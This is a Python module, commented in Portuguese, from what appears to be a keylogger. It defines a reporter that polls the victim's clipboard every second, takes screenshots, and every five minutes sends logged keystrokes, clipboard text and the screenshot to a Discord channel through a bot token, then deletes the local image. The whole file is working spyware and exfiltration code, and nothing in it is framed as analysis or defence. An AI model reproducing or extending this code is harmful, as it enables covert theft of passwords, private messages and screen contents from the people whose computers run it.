import asyncio
import os
import time
import tempfile
import pyautogui
import pyperclip
import discord
from datetime import datetime
from .buffer_manager import BufferManager


class Reporter:
    """Envia relatórios periódicos para o canal Discord configurado."""

    def __init__(self, discord_token: str, channel_id: int, buffer: BufferManager):
        self.discord_token = discord_token
        self.channel_id = channel_id
        self.buffer = buffer
        self.start_time = time.time()
        self.temp_dir = tempfile.mkdtemp(prefix="kl_")
        self.client = discord.Client(intents=discord.Intents.default())
        self._setup_events()

    def _setup_events(self):
        @self.client.event
        async def on_ready():
            print(f'[+] Reporter conectado como {self.client.user}')
            asyncio.create_task(self._monitor_clipboard())
            asyncio.create_task(self._periodic_report())

    async def _monitor_clipboard(self):
        while True:
            try:
                clip = pyperclip.paste()
                with self.buffer.lock:
                    if clip != self.buffer.last_clipboard and clip.strip():
                        self.buffer.last_clipboard = clip
                        ts = datetime.now().strftime('%H:%M:%S')
                        self.buffer.clipboard.append(f"{ts} 📋\n{clip[:500]}")
            except Exception:
                pass
            await asyncio.sleep(1)

    async def _capture_screenshot(self) -> str | None:
        try:
            path = os.path.join(self.temp_dir, f'ss_{datetime.now().strftime("%H%M%S")}.png')
            pyautogui.screenshot().save(path)
            return path
        except Exception:
            return None

    def _build_report(self, data: dict) -> str:
        parts = []
        if data['keystrokes']:
            lines = [f"{s['time']}: {', '.join(s['keys'])}" for s in data['keystrokes']]
            parts.append("**⌨️ Teclas:**\n" + "\n".join(lines))
        if data['clipboard']:
            parts.append("**📋 Clipboard:**\n" + "\n".join(data['clipboard']))
        uptime = int(time.time() - self.start_time)
        parts.append(f"⏱️ Uptime: {uptime//3600}h {(uptime%3600)//60}m")
        return "\n\n".join(parts)

    async def _periodic_report(self):
        while True:
            await asyncio.sleep(300)  # 5 minutos
            with self.buffer.lock:
                data = self.buffer.snapshot()
                self.buffer.clear_all()
            screenshot = await self._capture_screenshot()
            report = self._build_report(data)
            try:
                channel = self.client.get_channel(self.channel_id)
                files = [discord.File(screenshot)] if screenshot and os.path.exists(screenshot) else []
                await channel.send(
                    content=f"📊 Relatório - {datetime.now().strftime('%d/%m %H:%M')}\n{report}",
                    files=files
                )
                if screenshot and os.path.exists(screenshot):
                    os.remove(screenshot)
            except Exception as e:
                print(f"[!] Erro ao enviar: {e}")

    def run(self):
        self.client.run(self.discord_token)
